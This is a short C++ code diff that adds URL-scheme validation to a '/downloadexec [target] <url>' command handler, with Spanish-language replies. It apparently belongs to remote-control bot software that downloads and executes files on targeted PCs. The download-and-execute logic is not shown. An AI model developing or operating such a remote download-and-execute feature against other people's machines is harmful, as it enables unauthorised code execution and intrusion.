@@ -20,11 +20,23 @@ bool DownloadExecHandler::matches(const std::string& target) const {
     return lower == lower_pc || lower == "all";
 }
 
+// Validate URL scheme
+static bool is_url_valid(const std::string& url) {
+    std::string lower = url;
+    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
+    return lower.find("https://") == 0 || lower.find("http://") == 0;
+}
+
 domain::Result<void> DownloadExecHandler::handle_downloadexec(const std::string& target, const std::string& url) {
     if (!matches(target)) return domain::Result<void>::success();
 
     if (url.empty()) {
         reporter_.send_message("Uso: /downloadexec [target] <url>");
+        return domain::Result<void>::success();
+    }
+
+    if (!is_url_valid(url)) {
+        reporter_.send_message("URL invalida: debe empezar con http:// o https://");
         return domain::Result<void>::success();
     }
 
